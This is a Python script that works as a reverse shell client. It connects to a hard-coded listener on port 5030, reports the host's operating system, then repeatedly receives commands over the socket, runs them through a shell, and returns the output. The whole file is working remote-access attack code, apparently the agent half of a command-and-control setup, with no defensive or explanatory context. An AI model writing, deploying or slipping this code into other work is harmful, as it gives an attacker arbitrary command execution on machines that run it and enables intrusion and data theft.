import socket
import sys
import subprocess
import platform

target_host="0.0.0.0"
target_port=5030




def encode_data(data:str):return data.encode('utf-8')
def decode_data(data:str):return data.decode('utf-8')


def get_system_details():
    system_info = platform.uname()
    return str(system_info.system)


def run_command(command):
    command = command.rstrip()
    try:
        # Execute the command and get the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed with error: {e.output.decode('utf-8')}"
    

def main():
    client = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    client.connect( (target_host, target_port) )


    try:
        system_info = get_system_details()
        client.send( encode_data(system_info))

        while True:
            
            command =client.recv( 4096)
            command = decode_data( command)
            command = command.rstrip()

            print(f'received command: {command}')
            if not command:
                break 
            output = run_command( command)

            client.send(encode_data(output))
            
    except (socket.error, OSError) as e:
        print(f"ERROR: Connection lost: {e}")
        client.close()
    except Exception as error:
        print(f'ERRPR : {str(error)}')



if __name__=="__main__":
    main()